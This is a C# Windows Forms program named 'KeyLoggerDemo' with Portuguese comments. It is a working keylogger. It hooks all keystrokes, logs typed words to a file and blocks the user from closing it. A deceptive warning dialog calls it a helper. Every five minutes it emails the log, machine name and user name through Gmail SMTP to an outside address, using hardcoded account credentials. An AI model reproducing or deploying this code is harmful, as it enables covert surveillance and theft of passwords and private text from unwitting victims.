﻿using System;
using System.IO;
using System.Net;
using System.Net.Mail;
using System.Runtime.InteropServices;
using System.Windows.Forms;

namespace KeyLoggerDemo
{
    public class Program : Form
    {
        private static string logFilePath = "keylog.txt";
        private static System.Windows.Forms.Timer emailTimer;
        private static string userEmail = "macksoupletter@gmail.com"; // Coloque seu email aqui
        private static string emailPassword = "nofe ettp hxvf mqqp"; // Coloque sua senha aqui
        private static string smtpServer = "smtp.gmail.com"; // Servidor SMTP do Gmail
        private static int smtpPort = 587; // Porta SMTP (geralmente 587 para TLS)
        private static string currentWord = ""; // Variável para armazenar a palavra atual

        [DllImport("user32.dll")]
        private static extern IntPtr SetWindowsHookEx(int idHook, LowLevelKeyboardProc lpfn, IntPtr hMod, uint dwThreadId);
        [DllImport("user32.dll")]
        private static extern bool UnhookWindowsHookEx(IntPtr hhk);
        [DllImport("user32.dll")]
        private static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode, IntPtr wParam, IntPtr lParam);
        [DllImport("kernel32.dll")]
        private static extern IntPtr GetModuleHandle(string lpModuleName);

        private delegate IntPtr LowLevelKeyboardProc(int nCode, IntPtr wParam, IntPtr lParam);
        private static LowLevelKeyboardProc _proc = HookCallback;
        private static IntPtr _hookID = IntPtr.Zero;

        private const int WH_KEYBOARD_LL = 13;
        private const int WM_KEYDOWN = 0x0100;
        private const int VK_BACK = 0x08; // Tecla Backspace
        private const int VK_SPACE = 0x20; // Tecla Espaço
        private const int VK_ENTER = 0x0D; // Tecla Enter

        public Program()
        {
            this.FormClosing += new FormClosingEventHandler(OnFormClosing);
            ShowWarning();
            SetupEmailTimer();
        }

        public static void Main()
        {
            _hookID = SetHook(_proc);
            Application.Run(new Program());
            UnhookWindowsHookEx(_hookID);
        }

        private static IntPtr SetHook(LowLevelKeyboardProc proc)
        {
            using (System.Diagnostics.Process curProcess = System.Diagnostics.Process.GetCurrentProcess())
            using (System.Diagnostics.ProcessModule curModule = curProcess.MainModule)
            {
                return SetWindowsHookEx(WH_KEYBOARD_LL, proc, GetModuleHandle(curModule.ModuleName), 0);
            }
        }

        private static IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam)
        {
            if (nCode >= 0 && wParam == (IntPtr)WM_KEYDOWN)
            {
                int vkCode = Marshal.ReadInt32(lParam);
                HandleKey((Keys)vkCode);
            }
            return CallNextHookEx(_hookID, nCode, wParam, lParam);
        }

        private static void HandleKey(Keys key)
        {
            if (key == Keys.Enter)
            {
                LogWord(currentWord); // Registra a palavra atual ao pressionar Enter
                currentWord = ""; // Reseta a palavra atual
            }
            else if (key == Keys.Back)
            {
                if (currentWord.Length > 0)
                    currentWord = currentWord.Substring(0, currentWord.Length - 1); // Remove o último caractere
            }
            else if (key == Keys.Space)
            {
                if (!string.IsNullOrEmpty(currentWord))
                {
                    LogWord(currentWord); // Registra a palavra atual ao pressionar Espaço
                    currentWord = ""; // Reseta a palavra atual
                }
            }
            else if ((key >= Keys.A && key <= Keys.Z) || (key >= Keys.D0 && key <= Keys.D9))
            {
                currentWord += key.ToString(); // Adiciona a letra ou número à palavra atual
            }
        }

        private static void LogWord(string word)
        {
            if (!string.IsNullOrEmpty(word))
            {
                string timestamp = DateTime.Now.ToString("yyyy-MM-dd HH:mm:ss");
                string logEntry = timestamp + " - " + word + Environment.NewLine; // Usando concatenação

                using (StreamWriter writer = new StreamWriter(logFilePath, true))
                {
                    writer.Write(logEntry); // Escrever entrada formatada
                }
            }
        }

        private void OnFormClosing(object sender, FormClosingEventArgs e)
        {
            // Verifica se a razão do fechamento é desligamento do sistema
            if (e.CloseReason == CloseReason.WindowsShutDown)
            {
                // Permite o fechamento do aplicativo
            }
            else
            {
                e.Cancel = true; // Impede o fechamento em outros casos
            }
        }

        private void ShowWarning()
        {
            MessageBox.Show("This program has been made for help purposes, if you close it will make a dangerous mistake, stay warned, do it at your own risk.", "Warning", MessageBoxButtons.OK, MessageBoxIcon.Warning);
        }

        private void SetupEmailTimer()
        {
            emailTimer = new System.Windows.Forms.Timer(); // Usando System.Windows.Forms.Timer
            emailTimer.Interval = 300000; // 5 minutos em milissegundos
            emailTimer.Tick += SendLogByEmail; // Usando Tick em vez de Elapsed
            emailTimer.Start();
        }

        private void SendLogByEmail(object sender, EventArgs e)
        {
            try
            {
                string machineName = Environment.MachineName;
                string userName = Environment.UserName;
                string emailBody = "Aqui está o log das teclas.\n\n" +
                                   "Nome da Máquina: " + machineName + "\n" +
                                   "Nome do Usuário: " + userName;

                MailMessage mail = new MailMessage();
                mail.From = new MailAddress(userEmail);
                mail.To.Add("bashlover142@gmail.com"); // Envie para o email desejado
                mail.Subject = "Peguei um Safadinho rsrsrs";
                mail.Body = emailBody;

                Attachment attachment = new Attachment(logFilePath);
                mail.Attachments.Add(attachment);

                SmtpClient smtpClient = new SmtpClient(smtpServer, smtpPort);
                smtpClient.Credentials = new NetworkCredential(userEmail, emailPassword);
                smtpClient.EnableSsl = true; // Habilite SSL

                smtpClient.Send(mail);
                attachment.Dispose();
            }
            catch (Exception ex)
            {
                // Agora a variável ex é utilizada para logar a exceção
                Console.WriteLine("Erro ao enviar email: " + ex.Message);
            }
        }
    }
}